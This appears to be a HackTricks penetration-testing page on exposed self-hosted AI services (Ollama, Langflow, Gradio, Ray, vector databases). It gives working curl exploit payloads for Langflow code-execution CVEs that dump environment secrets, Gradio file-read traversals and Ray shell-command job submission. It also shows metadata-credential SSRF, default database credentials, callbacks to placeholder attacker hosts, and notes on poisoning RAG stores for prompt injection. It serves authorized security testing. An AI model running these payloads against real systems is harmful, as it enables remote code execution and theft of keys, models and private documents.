# Exposed Self-Hosted AI Services

{{#include ../banners/hacktricks-training.md}}

Teams that build AI features often run their own model servers, agent builders, demo UIs, compute clusters and vector databases. Many of these tools were designed for a laptop or a closed lab network. Because of that, several of them have **no authentication by default**, or they have authentication that is turned off in the default configuration. When one of these services is reachable from the Internet, or from a network segment the attacker controls, the attacker usually gets one or more of these:

- Free use of the GPUs and the models.
- Theft of private models, documents and embeddings.
- Secrets from the process environment (LLM provider keys, cloud credentials, database passwords).
- Code execution on the host, because some of these APIs run code **as a feature**.

This page explains how to find and test the most common ones in a black-box assessment. For generic OpenAI-compatible inference endpoints and the llama.cpp `/slots` leak, see [AI Risk Frameworks](AI-Risk-Frameworks.md). For model-file deserialization, see [AI Models RCE](AI-Models-RCE.md).

## Quick fingerprinting

Request these paths without credentials. A JSON answer with the expected fields identifies the product, and in many cases the version too.

| Product | Default port | Unauthenticated fingerprint request | What identifies it |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | `{"version":"..."}`, list of local models |
| Langflow | 7860 | `GET /api/v1/version`, `GET /health` | Langflow version JSON |
| Gradio | 7860 | `GET /config` | Gradio app config with a `version` field |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, list of submitted jobs |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat nanoseconds, Chroma version |
| Qdrant | 6333 (REST), 6334 (gRPC) | `GET /`, `GET /collections` | Qdrant title/version, collection list |
| Weaviate | 8080 | `GET /v1/meta`, `GET /v1/schema` | Weaviate version, classes |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection list or an auth error |

The same services are often published behind a reverse proxy under a path prefix (for example `/ollama/`, `/ray/`, `/gradio/`), so also try these paths under any prefix you find in JavaScript bundles, API docs or `robots.txt`.

## Ollama

### What is exposed

Ollama is a local LLM runner. Its REST API listens on port 11434 and **has no authentication**. On a normal Linux install it binds to localhost, but the official Docker image exposes the API server publicly and runs it as root.<sup>[[1]](#references)</sup> The API has read routes and also model-management routes:<sup>[[2]](#references)</sup>

| Route | Method | Effect |
| --- | --- | --- |
| `/api/version` | GET | Server version |
| `/api/tags` | GET | Local models (including private/custom ones) |
| `/api/ps` | GET | Models currently loaded in memory |
| `/api/show` | POST | Model details (Modelfile, system prompt, parameters) |
| `/api/generate`, `/api/chat`, `/api/embed` | POST | Use the models (free compute) |
| `/api/pull`, `/api/push` | POST | Download a model from / upload a model to a registry |
| `/api/create`, `/api/copy`, `/api/delete` | POST/DELETE | Create, copy or delete models |

Black-box checks:

```bash
curl -s http://target:11434/api/version
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/ps
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
```

A model list returned without credentials already proves the exposure. `/api/show` is useful because custom models often carry an internal **system prompt** in their Modelfile. `/api/push` can send a private model to a registry the attacker controls, so an exposed instance also means model theft. Do not call `/api/delete` or `/api/create` against real targets.

### Probllama (CVE-2024-37032): digest path traversal to RCE

Ollama before **0.1.34** did not validate the `digest` field of a model manifest (it must be `sha256:` plus 64 hex digits) when it built the local blob path.<sup>[[3]](#references)</sup> Because `/api/pull` downloads a manifest from any registry the caller names, an attacker can run a small fake registry and serve a manifest like this:<sup>[[1]](#references)</sup>

```json
{
  "schemaVersion": 2,
  "config": { "digest": "../../../../../../../../../../../../../../../../../../../traversal" },
  "layers": [ { "digest": "../../../../../../../../../../../../../../../../../../../../../traversal" } ]
}
```

The digest is used as a file name under the models `blobs` directory, so the traversal gives **arbitrary file write** while the blob is stored. Wiz turned this into RCE in Docker deployments (where Ollama runs as root): write a malicious shared library, write its path into `/etc/ld.so.preload`, then send a request to `/api/chat` so Ollama starts a new process that loads the library.<sup>[[1]](#references)</sup> The same bug also gives **arbitrary file read**: plant a manifest whose digest points to a local file and then call `/api/push` towards the attacker registry, which uploads the referenced file.<sup>[[1]](#references)</sup>

Black-box test for an authorized assessment:

1. Read the version from `/api/version`. Versions below `0.1.34` are vulnerable.
2. As a safe proof, ask the server to pull from a host you control and only look for the callback:

```bash
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

A request from the target to your host proves that the unauthenticated pull primitive is reachable. Do not serve a traversal manifest unless the scope explicitly allows writing files on the target.

## Langflow

Langflow is a visual builder for LLM agents and flows. It stores the API keys of the LLM providers and tools used in the flows, so a compromise usually leaks those keys too.

### CVE-2025-3248: unauthenticated code validation RCE

Langflow before **1.3.0** exposed `POST /api/v1/validate/code` **without authentication**. The endpoint is meant to check the Python code of custom components. It parses the code with `ast`, and then compiles and runs the function definitions with `exec()`.<sup>[[4]](#references)</sup> Running a function definition does not run the function body, but Python **does evaluate decorators and default argument values when the function is defined**. So code placed in a decorator or a default argument runs on the server.<sup>[[4]](#references)</sup>

The Horizon3 PoCs raise an exception that contains the command output, and Langflow returns the exception message in the response body:<sup>[[4]](#references)</sup>

```bash
# Decorator variant
curl -X POST -H 'Content-Type: application/json' \
  http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"env\\\"))\")\ndef foo():\n  pass"}'

# Default-argument variant
curl -X POST -H 'Content-Type: application/json' \
  http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"env\\\"))\")):\n  pass"}'
```

`env` is a good first command because it shows the provider keys directly. CISA added CVE-2025-3248 to the Known Exploited Vulnerabilities catalog on 2025-05-05.<sup>[[5]](#references)</sup>

### CVE-2026-9198 / CVE-2026-9103: `auto_login` superuser token + code validation

The 1.3.0 fix only made `/api/v1/validate/code` require a logged-in user. But Langflow has an `AUTO_LOGIN` setting, **enabled by default**, that is meant for a single user on a laptop. When it is on, `GET /api/v1/auto_login` creates tokens for the default superuser and returns them to any caller. When it is off, the route returns 403 `"Auto login is disabled."`.<sup>[[6]](#references)[[7]](#references)</sup> CVE-2026-9103 covers the token issuance (Langflow OSS 1.0.0 to 1.10.0, fixed in 1.10.1). CVE-2026-9198 covers the chain with `/api/v1/validate/code`, which gives unauthenticated RCE again; CISA added it to KEV on 2026-08-04.<sup>[[7]](#references)[[8]](#references)</sup> The CVE-2026-9103 advisory text writes the route as `/api/v1/login/auto_login`, but the login router has no prefix, so the route is `/api/v1/auto_login`.<sup>[[6]](#references)[[7]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  http://target:7860/api/v1/validate/code \
  -d '{"code":"@exec(\"raise Exception(__import__(\\\"socket\\\").gethostbyname(\\\"<oast-host>\\\"))\")\ndef foo():\n  pass"}'
```

Current Langflow READMEs say that the official Docker images require a superuser password by default, so `auto_login` is mostly found on pip installs, older images and custom deployments.<sup>[[23]](#references)</sup> Even without code execution, a superuser token gives access to every flow, global variable and stored credential in the instance. Black-box order: fingerprint `/api/v1/version`, request `/api/v1/auto_login`, and use a DNS callback payload in `validate/code` as the RCE proof instead of a real command.

For Flowise MCP/workflow RCEs, see [MCP Servers](AI-MCP-Servers.md#flowise-mcp-workflow-rce-cve-2025-59528--cve-2025-8943).

## Gradio

Gradio is the most common Python UI for ML demos, Hugging Face Spaces and internal model tools. It serves user files through a `/file=<path>` route that is supposed to return only files inside allowed directories (for example its temp upload folder). `GET /config` returns the app config with the Gradio `version`, the component list and the component IDs.<sup>[[9]](#references)</sup>

### CVE-2023-51449: `/file=` traversal from an upload subdirectory

Before **4.11.0**, the `/file` route allowed path traversal. The check only made sure that the path was inside the temp folder, and it did not take into account the subdirectories that uploads create inside that folder. An attacker first uploads any file through `/upload` (which creates the subdirectory and returns its path), and then requests a path that starts in that subdirectory and climbs out with `../` or `%2e%2e%2f`.<sup>[[9]](#references)[[10]](#references)</sup> Browsers normalize `../`, so send the request with a tool that keeps the path as is, such as `curl --path-as-is`.<sup>[[10]](#references)</sup> The advisory also reports an SSRF in the same route.<sup>[[10]](#references)</sup> Horizon3 reports Gradio 4.0 to 4.10 as affected.<sup>[[9]](#references)</sup>

```bash
# 1. Upload a file and note the returned temp path, e.g. /tmp/gradio/<hash>/a.txt
curl -s -F 'files=@a.txt' http://target:7860/upload
# 2. Climb out of that directory
curl -s --path-as-is 'http://target:7860/file=/tmp/gradio/<hash>/..%2f..%2f..%2f..%2fetc/hostname'
```

### CVE-2024-1561: `/component_server` arbitrary method call

The `/component_server` endpoint lets the frontend call server-side helper functions of a component. Before **4.13.0** it called **any** method of the component object named by `fn_name`, with attacker-controlled `data`. The fix added a check that the method is marked as a server function, and returns 404 otherwise.<sup>[[11]](#references)</sup> The method `move_resource_to_block_cache()` copies a local file into Gradio's cache and returns the new path, which can then be downloaded with `/file=`.<sup>[[12]](#references)</sup> Affected versions are 3.47 to 3.50.2 and 4.3 to 4.12.<sup>[[9]](#references)</sup>

```bash
# 1. Take any component id from /config
curl -s http://target:7860/config | jq '.components[].id'
# 2. Copy a local file into the cache
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
# 3. Download the returned path
curl -s 'http://target:7860/file=<returned_path>'
```

On Hugging Face Spaces the secrets of the Space are environment variables, so the most valuable file is `/proc/self/environ`. Horizon3 read it by adding a `Range: bytes=0-9999` header to the `/file=` request.<sup>[[9]](#references)</sup> A secure version returns 404 `Function not found.` for `move_resource_to_block_cache`.<sup>[[11]](#references)</sup>

## Ray dashboard and Jobs API (ShadowRay)

Ray is a framework for distributed training and serving. Its dashboard listens on port **8265** and also hosts the **Jobs API**. Submitting a job means running a shell command (`entrypoint`) on the cluster, so this API is code execution by design.<sup>[[13]](#references)</sup> For years the dashboard had no authentication, and the Oligo "ShadowRay" research reports that it binds to `0.0.0.0` by default.<sup>[[14]](#references)</sup> CVE-2023-48022 describes the unauthenticated job submission. The vendor disputes it, because Ray's documentation says Ray must only run inside a strictly controlled network.<sup>[[15]](#references)</sup> Oligo saw this exploited in the wild to steal OpenAI, Hugging Face, Stripe and Slack tokens, cloud and Kubernetes credentials, database passwords, SSH keys and models, and to run cryptominers on GPU nodes.<sup>[[14]](#references)</sup>

Ray added optional token authentication in **2.52.0** (`RAY_AUTH_MODE=token`). Ray 2.59 turns it on by default for local clusters, and Ray 2.61 turns it on for all clusters.<sup>[[16]](#references)</sup> Older or misconfigured clusters remain open.

Black-box checks:

```bash
curl -s http://target:8265/api/version     # ray_version, session_name
curl -s http://target:8265/api/jobs/       # list existing jobs (entrypoints often contain secrets)
curl -s 'http://target:8265/nodes?view=summary'
```

If job listing works without a token and the scope allows code execution, use a DNS callback as the proof:

```bash
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
curl -s http://target:8265/api/jobs/<submission_id>/logs
```

Bishop Fox reported more Ray dashboard bugs, fixed in Ray 2.8.1, that are also worth testing on old versions:<sup>[[17]](#references)[[14]](#references)</sup>

- **CVE-2023-48023 (SSRF):** `GET /log_proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.
- **CVE-2023-6021 (local file read):** `GET /api/v0/logs/file?node_id=<id>&filename=/etc/passwd&lines=50`, with the node ID taken from `/nodes?view=summary`.

## Vector databases used by RAG

Retrieval-Augmented Generation (RAG) stores chunks of the original documents, their embeddings and their metadata in a vector database. The assistant reads the top results and puts them in the prompt. The chunks are usually the **plain text of private documents**, so read access to the database is a data leak. Write access is worse: an inserted chunk is later retrieved and placed in other users' prompts, which gives **persistent indirect prompt injection** (see [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

The main self-hosted vector databases ship without authentication:

- **Qdrant**: "By default, all self-deployed Qdrant instances are not secure. They are open to all network interfaces and do not have any kind of authentication configured." When a key is set, it is sent in the `api-key` header (or as `Authorization: Bearer`). A separate read-only key can exist.<sup>[[18]](#references)</sup>
- **Chroma**: authentication is disabled by default. When token auth is configured, the token is sent as `Authorization: Bearer <token>` or `X-Chroma-Token: <token>`.<sup>[[19]](#references)</sup>
- **Weaviate**: requests without credentials are treated as `user: anonymous`, with whatever permissions the authorization config gives that user. The docs only recommend anonymous access for development or evaluation.<sup>[[20]](#references)</sup>
- **Milvus**: authentication is off unless `common.security.authorizationEnabled` is `true`. When it is enabled, the initial `root` user has the password `Milvus`, and the token format is `username:password`.<sup>[[21]](#references)</sup>

Black-box checks (a 200 with data and without any key is the vulnerable signal):

```bash
# Qdrant
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
# Chroma (v2 API; v1 used /api/v1/collections)
curl -s http://target:8000/api/v2/heartbeat
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
# Weaviate
curl -s http://target:8080/v1/schema
curl -s 'http://target:8080/v1/objects?limit=3'
# Milvus REST (also try the default root:Milvus credentials when auth is on)
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Content-Type: application/json' -d '{}'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Read a few records and check whether the payload contains document text, user identifiers or tenant names. For write access, do not insert anything into a production collection. Show that the write API is reachable instead, for example by creating and immediately deleting an empty, clearly named test collection, and only when the scope allows it.

**Chroma pre-auth RCE (ChromaToast, CVE-2026-45829):** HiddenLayer reported that in Chroma 1.0.0 to 1.5.8, `POST /api/v2/tenants/{tenant}/databases/{db}/collections` builds the embedding function described in the request **before** it checks authentication. A configuration that points to an attacker-controlled Hugging Face model with `trust_remote_code: true` runs the attacker's model code on the server, even when authentication is enabled. At the time of the report no fixed version existed.<sup>[[22]](#references)</sup> So even a Chroma instance that requires a token should not be reachable by untrusted clients.

## References

- [1] [Wiz — Probllama: Ollama Remote Code Execution Vulnerability (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [2] [Ollama API documentation](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [NVD — CVE-2024-37032](https://nvd.nist.gov/vuln/detail/CVE-2024-37032)
- [4] [Horizon3.ai — Unsafe at Any Speed: Abusing Python Exec for Unauth RCE in Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [5] [NVD — CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248)
- [6] [Langflow source — login router (`auto_login`)](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [7] [IBM Security Bulletin — Unauthenticated Superuser Token Issuance via Auto-Login Endpoint (CVE-2026-9103)](https://www.ibm.com/support/pages/node/7278926)
- [8] [NVD — CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [9] [Horizon3.ai — Exploiting File Read Vulnerabilities in Gradio to Steal Secrets from Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [10] [Gradio advisory GHSA-6qm2-wpxq-7qh2 (CVE-2023-51449)](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [11] [Gradio fix commit for `/component_server` (CVE-2024-1561)](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [12] [NVD — CVE-2024-1561](https://nvd.nist.gov/vuln/detail/CVE-2024-1561)
- [13] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [14] [Oligo — ShadowRay: First Known Attack Campaign Targeting AI Workloads Exploited In The Wild](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [15] [NVD — CVE-2023-48022](https://nvd.nist.gov/vuln/detail/CVE-2023-48022)
- [16] [Ray token authentication](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [17] [Bishop Fox — Ray, Versions 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [18] [Qdrant — Security](https://qdrant.tech/documentation/security/)
- [19] [Chroma Cookbook — Chroma-native Auth](https://cookbook.chromadb.dev/security/legacy-auth/)
- [20] [Weaviate — Authentication](https://docs.weaviate.io/weaviate/configuration/authentication)
- [21] [Milvus — Authenticate User Access](https://milvus.io/docs/authenticate.md)
- [22] [HiddenLayer — ChromaToast Served Pre-Auth](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [23] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)

{{#include ../banners/hacktricks-training.md}}
